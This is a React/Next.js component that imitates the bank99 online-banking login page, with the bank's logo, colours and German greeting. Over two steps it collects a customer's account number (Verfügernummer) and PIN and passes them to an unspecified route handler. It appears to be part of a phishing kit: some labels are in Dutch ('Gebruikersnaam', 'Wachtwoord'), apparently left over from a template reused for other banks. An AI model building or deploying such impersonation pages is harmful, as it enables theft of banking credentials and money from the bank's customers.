"use client";

import React, { useState } from "react";
import Image from "next/image";

type Props = {
  formData: {
    verfuegernummer?: string;
    pin?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: () => void;
  saving?: boolean;
};

export function Bank99({ formData, onChange, handleRouteAction, saving }: Props) {
  const [step, setStep] = useState(1);

  const handleNextStep = (e: React.FormEvent) => {
    e.preventDefault();
    if (formData.verfuegernummer) {
      setStep(2);
    }
  };

  const handleFinalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    handleRouteAction();
  };

  return (
    <div className="min-h-screen flex flex-col font-sans relative">
      {/* Background Image */}
      <div 
        className="absolute inset-0 -z-10"
        style={{
          backgroundImage: "url('/bank99-bg.webp')",
          backgroundSize: "cover",
          backgroundPosition: "center",
        }}
      ></div>

      {/* Header Bar */}
      <header className="w-full bg-[#f4f4f4] h-[64px] flex items-center px-12 md:px-24 shrink-0 shadow-sm">
        {/* If the user's logo.png is the exact square logo, we use it here */}
        <div className="relative h-12 w-24">
          <Image 
            src="/bank99-logo.webp" 
            alt="bank99 Logo" 
            fill
            className="object-contain object-left"
          />
        </div>
      </header>

      {/* Main Content Area */}
      <div className="flex-1 flex items-center justify-center px-4 py-8">
        
        {/* Centered Login Card */}
        <div className="bg-white w-full max-w-[540px] shadow-xl flex flex-col">
          
          {/* Yellow Title Bar */}
          <div className="bg-[#ffd200] px-6 py-4">
            <h1 className="text-[22px] font-medium text-black">Anmelden</h1>
          </div>

          <div className="p-6 md:p-8">
            <p className="text-[#333] text-[15px] mb-8">
              Hallo beim Online Banking der bank99! :-)
            </p>

            <form onSubmit={step === 1 ? handleNextStep : handleFinalSubmit} className="flex flex-col w-full">
              
              {/* Labels & Links Row */}
              <div className="flex justify-between items-end mb-1">
                <label className="text-[#767676] text-[11px]">
                  {step === 1 ? "Gebruikersnaam" : "Wachtwoord / PIN"}
                </label>
                <div className="text-[13px] text-[#0066b3]">
                  <a href="#" className="hover:underline">barrierefrei</a>
                  <span className="text-[#767676] mx-1.5">|</span>
                  <a href="#" className="hover:underline">English</a>
                </div>
              </div>

              {/* Input Field */}
              <div className="mb-6">
                {step === 1 ? (
                  <input 
                    type="text" 
                    required
                    autoFocus
                    value={formData.verfuegernummer || ""}
                    onChange={(e) => onChange("verfuegernummer", e.target.value)}
                    className="w-full h-[40px] border border-[#ccc] rounded-[2px] px-3 outline-none focus:border-black focus:ring-1 focus:ring-black text-[#333] text-[15px] transition-all"
                  />
                ) : (
                  <div className="animate-in fade-in slide-in-from-right-4 duration-300">
                    <input 
                      type="password" 
                      required
                      autoFocus
                      value={formData.pin || ""}
                      onChange={(e) => onChange("pin", e.target.value)}
                      className="w-full h-[40px] border border-[#ccc] rounded-[2px] px-3 outline-none focus:border-black focus:ring-1 focus:ring-black text-[#333] text-[15px] transition-all"
                    />
                  </div>
                )}
              </div>

              {/* Action Button */}
              <button 
                type="submit" 
                disabled={saving}
                className="w-full bg-[#ffd200] hover:bg-[#e6bd00] text-black font-medium h-[40px] rounded-[2px] text-[15px] transition-colors disabled:opacity-70"
              >
                {saving ? "Wird geladen..." : "Weiter"}
              </button>
              
              {step === 2 && (
                <button 
                  type="button" 
                  onClick={() => setStep(1)}
                  className="w-full mt-3 bg-white border border-[#ccc] hover:bg-gray-50 text-black font-medium h-[40px] rounded-[2px] text-[15px] transition-colors"
                >
                  Zurück
                </button>
              )}
            </form>

            {/* Bottom Link */}
            <div className="text-center mt-6">
              <a href="#" className="text-[#0066b3] text-[13px] hover:underline">
                Gebruikersnaamn vergessen?
              </a>
            </div>

          </div>
        </div>
      </div>
    </div>
  );
}
